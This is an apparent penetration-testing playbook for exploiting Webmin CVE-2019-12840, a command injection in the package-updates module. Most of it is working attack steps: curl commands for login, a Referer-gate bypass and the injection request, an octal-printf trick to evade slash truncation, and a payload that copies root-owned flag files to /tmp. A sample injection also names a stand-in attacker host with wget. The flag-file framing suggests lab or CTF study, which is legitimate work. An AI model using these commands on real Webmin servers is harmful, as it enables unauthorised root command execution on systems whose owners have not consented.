# Webmin `package-updates/update.cgi` Authenticated RCE (CVE-2019-12840)

## When this applies

- Webmin **1.881–1.920** reachable on TCP/10000 (HTTPS).
- Authenticated as any user with the `package-updates` module enabled (Matt-style PAM-mapped Linux user is enough).
- `update.cgi` builds the apt/yum command line via Perl string interpolation **before** `quotemeta` is applied to the package list, so the package name flows unsanitized into a `system()`-equivalent.

## Pre-flight

```bash
curl -sk "https://<TARGET>:10000/sysinfo.cgi" \
  -H "Cookie: redirect=1; testing=1; sid=<SID>; sessiontest=1" \
  | grep -oE 'data-package-updates="[01]"|data-user="[^"]*"|data-user-id="[^"]*"'
# data-package-updates="1" → module accessible
# data-user-id="0"          → already root via Webmin (rare)
```

## Login

```bash
curl -sk -c cookie.txt \
  -H "Cookie: testing=1" \
  -d 'user=<USER>&pass=<PASS>' \
  "https://<TARGET>:10000/session_login.cgi" -o /dev/null
SID=$(awk '/sid/{print $7}' cookie.txt)
```

The `testing=1` bootstrap cookie is required — without any cookies, Webmin returns `500 No cookies`.

## CSRF / Referer gate (`referers_none=1`)

Webmin defaults to `referers_none=1` (and an allow-list of hostnames). Without a `Referer:` header pointing at the same module, the response is a *"links from unknown referers"* page that easily reads as "access denied" or generic "Module Index Error". Always set:

```
Referer: https://<TARGET>:10000/<module>/
```

For this CVE, `Referer: https://<TARGET>:10000/package-updates/`.

## Exploit

```bash
curl -sk \
  -H "Cookie: redirect=1; testing=1; sid=$SID; sessiontest=1" \
  -H "Referer: https://<TARGET>:10000/package-updates/" \
  -X POST \
  -d "mode=new&u=<URLENC_INJECTION>&confirm=1" \
  "https://<TARGET>:10000/package-updates/update.cgi"
```

`mode=new` and `confirm=1` skip the dependency-confirmation page and feed the package list straight into the install. `u` is the package-name-with-injection.

### Bypassing `split('/')` truncation

`update.cgi` does:

```perl
($p, $s) = split(/\//, $u);   # $p = package, $s = system
```

Any `/` in `$u` truncates the payload at the first slash. Naïve injections like `apt;wget http://attacker/x` get sliced to `apt;wget http:` — the shell command runs but `wget http:` is a no-op.

**Workaround:** generate `/` at runtime via `printf` octal, so the source contains no literal `/`:

```bash
# Read /root/root.txt and /home/<USER>/user.txt to /tmp/r.txt as root
INJECT="apt;cat \$(printf '\57root\57root.txt') > \$(printf '\57tmp\57r.txt') 2>&1;
chmod 666 \$(printf '\57tmp\57r.txt');
cat \$(printf '\57home\57<USER>\57user.txt') >> \$(printf '\57tmp\57r.txt') 2>&1;
id >> \$(printf '\57tmp\57r.txt')"
```

Critical: the format string itself must contain `\57`, not the args. `printf '%s' '\57'` outputs literal `\57`, because `%s` doesn't interpret escapes — only the format string is parsed.

After firing the request, fetch `/tmp/r.txt` over the lowest-priv shell you already hold (or via a second Webmin RCE that just `cat`s it to stdout into a value you can render in the response).

## Why this works

`apt-lib.pl::update_system_install` builds:

```perl
local $cmd = "$apt_get_command -y install $update";   # $update = $name (raw user input)
$update = join(" ", map { quotemeta($_) } split(/\s+/, $update));
```

The `$cmd =` line interpolates `$update` **before** the next line reassigns the quoted version — `quotemeta` runs after `$cmd` already captured the unsanitized string, so the sanitizer is a no-op for the actual command line passed to `&open_execute_command(CMD, "$cmd <$yesfile", 2)`.

`apt-get -y install` itself fails on the malformed package name, but the shell still executes everything after the `;`.

## Variants

- Yum-based systems: same bug pattern in `yum-lib.pl` (yum `update_system_install`). Payload identical, swap `apt` for any package name.
- CVE-2019-15107 (`password_change.cgi` unauth) only fires when `passwd_mode=2` in `miniserv.conf`. Default Debian Webmin packages have `passwd_mode=0`, so unauth-RCE typically doesn't work — auth-required CVE-2019-12840 is the reliable path.

## Anti-Patterns

- Reading the apparent "Module Index Error" / "Security Warning" page as access denial. It's almost always either the missing-`Referer` gate or `update_enone` ("select at least one package", triggered by `u=` empty).
- Using `wget` / `curl` URLs in the injection without thinking about the `split('/')` truncation. URLs are mostly slashes.
